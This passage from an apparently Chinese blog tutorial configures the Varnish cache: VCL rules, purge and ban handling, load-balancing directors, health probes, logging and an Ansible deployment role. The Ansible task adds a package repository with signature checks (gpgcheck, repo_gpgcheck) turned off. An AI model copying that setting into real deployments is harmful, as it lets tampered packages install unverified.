req.request：请求方法；</li><li>bereq.url, req.url：请求的url；</li><li>bereq.proto：请求的协议版本；</li><li>bereq.backend：指明要调用的后端主机；</li><li>req.http.Cookie：客户端的请求报文中Cookie首部的值；</li><li>req.http.User-Agent ~ “chrome”；</li><li>beresp.status, resp.status：响应的状态码；</li><li>reresp.proto, resp.proto：协议版本；</li><li>beresp.backend.name：BE主机的主机名；</li><li>beresp.ttl：BE主机响应的内容的余下的可缓存时长；</li><li>obj.hits：此对象从缓存中命中的次数；</li><li>obj.ttl：对象的ttl值</li><li>server.ip：varnish主机的IP；</li><li>server.hostname：varnish主机的Hostname；</li><li>client.ip：发请求至varnish主机的客户端IP；</li></ul><p><strong>示例2</strong>：强制对某类资源的请求不检查缓存</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"># vim /etc/varnish/default.vcl</span><br><span class="line">sub vcl_recv &#123;</span><br><span class="line">    if (req.url ~ &quot;(?i)^/(login|admin)&quot;) &#123;  #&quot;?i&quot;表示忽略大小写，匹配到url中带有login或admin的不查询缓存</span><br><span class="line">        return(pass);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"># varnish_reload_vcl</span><br><span class="line"># for i in &#123;1..5&#125;; do curl -I -s http://192.168.0.8/login |grep &quot;X-Cache&quot;; done  #客户端测试</span><br><span class="line">X-Cache: MISS from 192.168.0.8  #全部Miss</span><br><span class="line">X-Cache: MISS from 192.168.0.8</span><br><span class="line">X-Cache: MISS from 192.168.0.8</span><br><span class="line">X-Cache: MISS from 192.168.0.8</span><br><span class="line">X-Cache: MISS from 192.168.0.8</span><br><span class="line"># for i in &#123;1..5&#125;; do curl -I -s http://192.168.0.8/admin |grep &quot;X-Cache&quot;; done</span><br><span class="line">X-Cache: MISS from 192.168.0.8</span><br><span class="line">X-Cache: MISS from 192.168.0.8</span><br><span class="line">X-Cache: MISS from 192.168.0.8</span><br><span class="line">X-Cache: MISS from 192.168.0.8</span><br><span class="line">X-Cache: MISS from 192.168.0.8</span><br><span class="line"># for i in &#123;1..5&#125;; do curl -I -s http://192.168.0.8/ |grep &quot;X-Cache&quot;; done  #其他网页正常查询缓存</span><br><span class="line">X-Cache: MISS from 192.168.0.8</span><br><span class="line">X-Cache: HIT via 192.168.0.8</span><br><span class="line">X-Cache: HIT via 192.168.0.8</span><br><span class="line">X-Cache: HIT via 192.168.0.8</span><br><span class="line">X-Cache: HIT via 192.168.0.8</span><br></pre></td></tr></table></figure><p><strong>示例3</strong>：对于特定类型的资源，例如公开的图片等，取消其私有标识，并强行设定其可以由varnish缓存的时长</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">sub vcl_backend_response &#123;</span><br><span class="line">    if (beresp.http.cache-control !~ &quot;s-maxage&quot;) &#123;</span><br><span class="line">        if (bereq.url ~ &quot;(?i)\.(jpg|jpeg|png|gif|css|js)$&quot;) &#123;</span><br><span class="line">            unset beresp.http.Set-Cookie;</span><br><span class="line">            set beresp.ttl = 3600s;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><strong>示例4</strong>：在报文首部添加真正的客户端IP，使得后端server可以记录真正客户端来源</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line">[root@varnish ~]# vim /etc/varnish/default.vcl</span><br><span class="line">sub vcl_recv &#123;</span><br><span class="line">    if (req.restarts == 0) &#123;  #匹配没有被重写的URL请求，即第一次请求</span><br><span class="line">        if (req.http.X-Forwarded-For) &#123;  #变量存在并且有值则为真</span><br><span class="line">            set req.http.X-Forwarded-For = req.http.X-Forwarded-For + &quot;,&quot; + client.ip;  #将真正的client.ip添加到此变量中，用&quot;,&quot;隔开</span><br><span class="line">        &#125; else &#123;</span><br><span class="line">            set req.http.X-Forwarded-For = client.ip;  #如果变量不存在或值为空，则直接将client.ip赋值与</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">[root@varnish ~]# varnishadm -S /etc/varnish/secret -T 127.0.0.1:6082</span><br><span class="line">varnish&gt; vcl.load conf1 /etc/varnish/default.vcl</span><br><span class="line">varnish&gt; vcl.use conf1</span><br><span class="line">varnish&gt; vcl.list   </span><br><span class="line">available       0 boot</span><br><span class="line">available       0 reload_2018-07-14T09:55:58</span><br><span class="line">active          0 conf1  #当前正在使用的配置</span><br><span class="line">[root@web1 ~]# vim /etc/httpd/conf/httpd.conf</span><br><span class="line">LogFormat &quot;%&#123;X-Forwarded-For&#125;i %l %u %t \&quot;%r\&quot; %&gt;s %b \&quot;%&#123;Referer&#125;i\&quot; \&quot;%&#123;User-Agent&#125;i\&quot;&quot; combined</span><br><span class="line">[root@web1 ~]# systemctl restart httpd</span><br><span class="line">[root@client ~]# for i in &#123;1..5&#125;; do curl -I -s http://192.168.0.8/login |grep &quot;X-Cache&quot;; done #在客户端测试</span><br><span class="line">[root@web1 ~]# tail /var/log/httpd/access_log </span><br><span class="line">192.168.0.8 - - [14/Jul/2018:09:56:49 +0800] &quot;HEAD /login HTTP/1.1&quot; 301 - &quot;-&quot; &quot;curl/7.29.0&quot;</span><br><span class="line">192.168.0.8 - - [14/Jul/2018:09:56:49 +0800] &quot;HEAD /login HTTP/1.1&quot; 301 - &quot;-&quot; &quot;curl/7.29.0&quot;</span><br><span class="line">192.168.0.8 - - [14/Jul/2018:09:56:49 +0800] &quot;HEAD /login HTTP/1.1&quot; 301 - &quot;-&quot; &quot;curl/7.29.0&quot;</span><br><span class="line">192.168.0.8 - - [14/Jul/2018:09:56:49 +0800] &quot;HEAD /login HTTP/1.1&quot; 301 - &quot;-&quot; &quot;curl/7.29.0&quot;</span><br><span class="line">192.168.0.8 - - [14/Jul/2018:09:56:49 +0800] &quot;HEAD /login HTTP/1.1&quot; 301 - &quot;-&quot; &quot;curl/7.29.0&quot;</span><br><span class="line">192.168.0.7 - - [14/Jul/2018:10:25:11 +0800] &quot;HEAD /login HTTP/1.1&quot; 301 - &quot;-&quot; &quot;curl/7.29.0&quot;</span><br><span class="line">192.168.0.7 - - [14/Jul/2018:10:25:11 +0800] &quot;HEAD /login HTTP/1.1&quot; 301 - &quot;-&quot; &quot;curl/7.29.0&quot;</span><br><span class="line">192.168.0.7 - - [14/Jul/2018:10:25:11 +0800] &quot;HEAD /login HTTP/1.1&quot; 301 - &quot;-&quot; &quot;curl/7.29.0&quot;</span><br><span class="line">192.168.0.7 - - [14/Jul/2018:10:25:11 +0800] &quot;HEAD /login HTTP/1.1&quot; 301 - &quot;-&quot; &quot;curl/7.29.0&quot;</span><br><span class="line">192.168.0.7 - - [14/Jul/2018:10:25:11 +0800] &quot;HEAD /login HTTP/1.1&quot; 301 - &quot;-&quot; &quot;curl/7.29.0&quot;  #拿到了真正客户端IP，而不是之前的varnish服务器的IP</span><br></pre></td></tr></table></figure><p><strong>示例5</strong>：访问控制，拒绝curl客户端的访问</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">sub vcl_recv &#123;</span><br><span class="line">    if(req.http.User-Agent ~ &quot;curl&quot;) &#123;</span><br><span class="line">        return(synth(403));</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="缓存对象的修剪：purge"><a href="#缓存对象的修剪：purge" class="headerlink" title="缓存对象的修剪：purge"></a>缓存对象的修剪：purge</h3><p>1) 能执行purge操作</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">sub vcl_purge &#123;</span><br><span class="line">    return (synth(200,&quot;Purged&quot;));</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>2) 何时执行purge操作</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">sub vcl_recv &#123;</span><br><span class="line">    if (req.method == &quot;PURGE&quot;) &#123;</span><br><span class="line">        return(purge);</span><br><span class="line">    &#125;</span><br><span class="line">    ...</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><strong>示例6</strong>：清除指定缓存</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">[root@varnish ~]# vim /etc/varnish/default.vcl</span><br><span class="line">acl purgers &#123;</span><br><span class="line">    &quot;127.0.0.0&quot;/8;</span><br><span class="line">    &quot;192.168.0.0&quot;/24;</span><br><span class="line">&#125;</span><br><span class="line">sub vcl_recv &#123;</span><br><span class="line">    if (req.method == &quot;PURGE&quot;) &#123;</span><br><span class="line">        if (!client.ip ~ purgers) &#123;</span><br><span class="line">            return(synth(405,&quot;Purging not allowed for &quot; + client.ip));</span><br><span class="line">        &#125;</span><br><span class="line">        return(purge);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">varnish&gt; vcl.load conf3 /etc/varnish/default.vcl</span><br><span class="line">varnish&gt; vcl.use conf3</span><br><span class="line">[root@client ~]# curl -I http://192.168.0.8/</span><br><span class="line">X-Cache: HIT via 192.168.0.8</span><br><span class="line">[root@client ~]# curl -I -X &quot;PURGE&quot;  http://192.168.0.8/</span><br><span class="line">[root@client ~]# curl -I http://192.168.0.8/</span><br><span class="line">X-Cache: MISS from 192.168.0.8</span><br></pre></td></tr></table></figure><h3 id="缓存对象的修剪：Banning"><a href="#缓存对象的修剪：Banning" class="headerlink" title="缓存对象的修剪：Banning"></a>缓存对象的修剪：Banning</h3><p>1）varnishadm： <code>ban &lt;field&gt; &lt;operator&gt; &lt;arg&gt;</code></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">varnish&gt; ban req.url ~ (?i)^/javascripts</span><br></pre></td></tr></table></figure><p>2）在配置文件中定义，使用ban()函数</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">sub vcl_recv &#123;</span><br><span class="line">    if (req.method == &quot;BAN&quot;) &#123;</span><br><span class="line">        ban(&quot;req.http.host == &quot; + req.http.host + &quot; &amp;&amp; req.url == &quot; + req.url);  #将规则拼接起来传递给ban函数</span><br><span class="line">        return(synth(200, &quot;Ban added&quot;));</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"># curl -I -X &quot;BAN&quot; http://192.168.0.8/javascripts/</span><br></pre></td></tr></table></figure><h1 id="多个后端主机实现调度功能"><a href="#多个后端主机实现调度功能" class="headerlink" title="多个后端主机实现调度功能"></a>多个后端主机实现调度功能</h1><h2 id="动静分离示例："><a href="#动静分离示例：" class="headerlink" title="动静分离示例："></a>动静分离示例：</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">backend default &#123;</span><br><span class="line">.host = &quot;172.16.0.9&quot;;</span><br><span class="line">.port = &quot;80&quot;;</span><br><span class="line">&#125;</span><br><span class="line">backend appsrv &#123;</span><br><span class="line">.host = &quot;172.16.0.10&quot;;</span><br><span class="line">.port = &quot;80&quot;;</span><br><span class="line">&#125;</span><br><span class="line">sub vcl_recv &#123;</span><br><span class="line">if (req.url ~ &quot;(?i)\.php$&quot;) &#123;</span><br><span class="line">set req.backend_hint = appsrv;</span><br><span class="line">&#125; else &#123;</span><br><span class="line">set req.backend_hint = default;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="轮询调度"><a href="#轮询调度" class="headerlink" title="轮询调度"></a>轮询调度</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">import directors;</span><br><span class="line">backend srv1 &#123;</span><br><span class="line">    .host = &quot;192.168.0.9&quot;;</span><br><span class="line">    .port = &quot;80&quot;;</span><br><span class="line">&#125;</span><br><span class="line">backend srv2 &#123;</span><br><span class="line">    .host = &quot;192.168.0.10&quot;;</span><br><span class="line">    .port = &quot;80&quot;;</span><br><span class="line">&#125;</span><br><span class="line">sub vcl_init &#123;</span><br><span class="line">    new websrvs = directors.round_robin();  #round_robin()调度算法，不支持加权</span><br><span class="line">    websrvs.add_backend(srv1);</span><br><span class="line">    websrvs.add_backend(srv2);</span><br><span class="line">&#125;</span><br><span class="line">sub vcl_recv &#123;</span><br><span class="line">    set req.backend_hint = websrvs.backend();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="基于cookie的session-sticky"><a href="#基于cookie的session-sticky" class="headerlink" title="基于cookie的session sticky"></a>基于cookie的session sticky</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">sub vcl_init &#123;</span><br><span class="line">new h = directors.hash();</span><br><span class="line">h.add_backend(one, 1);</span><br><span class="line">h.add_backend(two, 1);</span><br><span class="line">&#125;</span><br><span class="line">sub vcl_recv &#123;</span><br><span class="line">set req.backend_hint = h.backend(req.http.cookie);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="随机调度，支持权重"><a href="#随机调度，支持权重" class="headerlink" title="随机调度，支持权重"></a>随机调度，支持权重</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">sub vcl_init &#123;</span><br><span class="line">    new websrvs = directors.random();</span><br><span class="line">    websrvs.add_backend(srv1, 1);</span><br><span class="line">    websrvs.add_backend(srv2, 2);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="后端健康检查"><a href="#后端健康检查" class="headerlink" title="后端健康检查"></a>后端健康检查</h2><blockquote><p>.probe：定义健康状态检测方法；<br>    .url：检测时要请求的URL，默认为”/“;<br>    .request：发出的具体请求；<br>        .request =<br>            “GET /.healthtest.html HTTP/1.1”<br>            “Host: <a href="http://www.fenghong.tech&quot;" target="_blank" rel="noopener">www.fenghong.tech&quot;</a><br>            “Connection: close”<br>    .window：基于最近的多少次检查来判断其健康状态；<br>    .threshold：最近.window中定义的这么次检查中至有.threshhold定义的次数是成功的；<br>    .interval：检测频度；<br>    .timeout：超时时长；<br>    .expected_response：期望的响应码，默认为200；</p></blockquote><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line">import directors;</span><br><span class="line">probe http_chk &#123;</span><br><span class="line">        .url = &quot;/index.html&quot;;</span><br><span class="line">        .interval = 2s;</span><br><span class="line">        .timeout = 2s;</span><br><span class="line">        .window = 10;  #最近10次检查</span><br><span class="line">        .threshold = 7;  #有7次成功则为健康主机</span><br><span class="line">&#125;</span><br><span class="line">backend srv1 &#123;</span><br><span class="line">        .host = &quot;192.168.0.9&quot;;</span><br><span class="line">        .port = &quot;80&quot;;</span><br><span class="line">        .probe = http_chk;</span><br><span class="line">&#125;</span><br><span class="line">backend srv2 &#123;</span><br><span class="line">        .host = &quot;192.168.0.10&quot;;</span><br><span class="line">        .port = &quot;80&quot;;</span><br><span class="line">        .probe = http_chk;</span><br><span class="line">&#125;</span><br><span class="line">sub vcl_init &#123;</span><br><span class="line">        new websrvs = directors.random();</span><br><span class="line">        websrvs.add_backend(srv1, 1);</span><br><span class="line">        websrvs.add_backend(srv2, 2);</span><br><span class="line">&#125;</span><br><span class="line">sub vcl_recv &#123;</span><br><span class="line">        set req.backend_hint = websrvs.backend();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">varnish&gt; backend.list #查看后端主机健康状态信息     </span><br><span class="line">Backend name                   Refs   Admin      Probe</span><br><span class="line">srv1(192.168.0.9,,80)          3      probe      Healthy 10/10</span><br><span class="line">srv2(192.168.0.10,,80)         3      probe      Healthy 10/10</span><br><span class="line">varnish&gt; backend.set_health srv1 sick|healthy|auto  #手动标记主机状态 down|up|probe</span><br></pre></td></tr></table></figure><p>设置后端的主机属性：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">backend BE_NAME &#123;</span><br><span class="line">...</span><br><span class="line">.connect_timeout = 0.5s;  #连接超时时间</span><br><span class="line">.first_byte_timeout = 20s;  #第一个字节20s不响应则为超时</span><br><span class="line">.between_bytes_timeout = 5s;  #第一个字节和第二个字节间隔超时时间</span><br><span class="line">.max_connections = 50;  #最大连接数</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="varnish的运行时参数"><a href="#varnish的运行时参数" class="headerlink" title="varnish的运行时参数"></a>varnish的运行时参数</h2><blockquote><p>最大并发连接数 = thread_pools  * thread_pool_max</p></blockquote><ul><li>thread_pools：工作线程数，最好小于或等于CPU核心数量</li><li>thread_pool_max：每线程池的最大线程数</li><li>thread_pool_min：最大空闲线程数</li><li>thread_pool_timeout：空闲超过多长时间被清除</li><li>thread_pool_add_delay：生成线程之前等待的时间</li><li>thread_pool_destroy_delay：清除超出最大空闲线程数的线程之前等待的时间</li></ul><h2 id="日志管理"><a href="#日志管理" class="headerlink" title="日志管理"></a>日志管理</h2><p>virnish的日志默认存储在80M的内存空间中，如果日志记录超出了则覆盖前边的日志，服务器重启后丢失；需要更改配置使其永久保存到磁盘</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"># varnishstat -1 -f MAIN  #指定查看MAIN段的信息</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"># varnishstat -1 -f MAIN.cache_hit -f MAIN.cache_miss  #显示指定参数的当前统计数据</span><br><span class="line">MAIN.cache_hit              47         0.00 Cache hits</span><br><span class="line">MAIN.cache_miss             89         0.01 Cache misses</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"># varnishtop -1 -i ReqHeader  #显示指定的排序信息</span><br><span class="line">   165.00 ReqHeader Accept: */*</span><br><span class="line">   165.00 ReqHeader Host: 192.168.0.8</span><br><span class="line">   165.00 ReqHeader User-Agent: curl/7.29.0</span><br><span class="line">   165.00 ReqHeader X-Forwarded-For: 192.168.0.7</span><br></pre></td></tr></table></figure><p>将日志永久保存到：<code>/var/log/varnish/varnish.log</code></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"># systemctl start varnishlog.service</span><br></pre></td></tr></table></figure><p>以Apache/NCSA日志格式显示</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"># varnishncsa</span><br><span class="line">192.168.0.7 - - [14/Jul/2018:12:34:23 +0800] &quot;GET http://192.168.0.8/javascripts/test1.html HTTP/1.1&quot; 200 11 &quot;-&quot; &quot;curl/7.29.0&quot;</span><br></pre></td></tr></table></figure><h1 id="ansible-role-varnish"><a href="#ansible-role-varnish" class="headerlink" title="ansible-role-varnish"></a>ansible-role-varnish</h1><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"># tree ansible-role-varnish/</span><br><span class="line">ansible-role-varnish/</span><br><span class="line">├── files</span><br><span class="line">│   ├── default.vcl</span><br><span class="line">│   ├── secret</span><br><span class="line">│   └── varnish.params</span><br><span class="line">├── handlers</span><br><span class="line">│   └── main.yml</span><br><span class="line">├── tasks</span><br><span class="line">│   ├── copy.yml</span><br><span class="line">│   ├── main.yml</span><br><span class="line">│   ├── setup-varnish.yml</span><br><span class="line">│   └── start.yml</span><br><span class="line">└── templates</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line"># find ansible-role-varnish/ -name *.yml -exec ls &#123;&#125; \; -exec cat &#123;&#125; \;</span><br><span class="line">ansible-role-varnish/handlers/main.yml</span><br><span class="line">- name: restart varnish</span><br><span class="line">  service: name=varnish state=restarted</span><br><span class="line">- name: reload vcl</span><br><span class="line">  command: varnish_reload_vcl</span><br><span class="line">ansible-role-varnish/tasks/start.yml</span><br><span class="line">- name: start service</span><br><span class="line">  service: name=varnish state=started</span><br><span class="line">ansible-role-varnish/tasks/copy.yml</span><br><span class="line">- name: copy configure file</span><br><span class="line">  copy: src=varnish.params dest=/etc/varnish/varnish.params</span><br><span class="line">  notify: restart varnish</span><br><span class="line">- name: copy secret file</span><br><span class="line">  copy: src=secret dest=/etc/varnish/secret</span><br><span class="line">  notify: restart varnish</span><br><span class="line">- name: copy default.vcl file</span><br><span class="line">  copy: src=default.vcl dest=/etc/varnish/default.vcl</span><br><span class="line">  notify: reload vcl</span><br><span class="line">ansible-role-varnish/tasks/main.yml</span><br><span class="line">- include: setup-varnish.yml</span><br><span class="line">- include: copy.yml</span><br><span class="line">- include: start.yml</span><br><span class="line">ansible-role-varnish/tasks/setup-varnish.yml</span><br><span class="line">- name: install yum-utils</span><br><span class="line">  yum: name=&#123;&#123; item &#125;&#125; state=present</span><br><span class="line">  with_items:</span><br><span class="line">    - yum-utils</span><br><span class="line">    - pygpgme</span><br><span class="line">- name: Add epel repo</span><br><span class="line">  yum_repository:</span><br><span class="line">    name: alibaba</span><br><span class="line">    description: epel</span><br><span class="line">    baseurl: https://mirrors.aliyun.com/epel/7Server/x86_64/</span><br><span class="line">    repo_gpgcheck: no</span><br><span class="line">    gpgcheck: no</span><br><span class="line">    enabled: yes</span><br><span class="line">- name: install varnish</span><br><span class="line">  yum: name=varnish state=present</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br></pre></td><td class="code"><pre><span class="line"># find ansible-role-varnish/files/* -exec ls &#123;&#125; \; -exec cat &#123;&#125; \;</span><br><span class="line">ansible-role-varnish/files/default.vcl</span><br><span class="line">#-------------------------------------------------</span><br><span class="line">vcl 4.0;</span><br><span class="line">import directors;</span><br><span class="line"></span><br><span class="line">backend default &#123;</span><br><span class="line">    .host = &quot;127.0.0.1&quot;;</span><br><span class="line">    .port = &quot;8080&quot;;</span><br><span class="line">&#125;</span><br><span class="line">probe http_chk &#123;</span><br><span class="line">        .url = &quot;/index.html&quot;;</span><br><span class="line">        .interval = 2s;</span><br><span class="line">        .timeout = 2s;</span><br><span class="line">        .window = 10;</span><br><span class="line">        .threshold = 7;</span><br><span class="line">&#125;</span><br><span class="line">backend srv1 &#123;</span><br><span class="line">    .host = &quot;192.168.0.9&quot;;</span><br><span class="line">    .port = &quot;80&quot;;</span><br><span class="line">    .probe = http_chk;</span><br><span class="line">&#125;</span><br><span class="line">backend srv2 &#123;</span><br><span class="line">    .host = &quot;192.168.0.10&quot;;</span><br><span class="line">    .port = 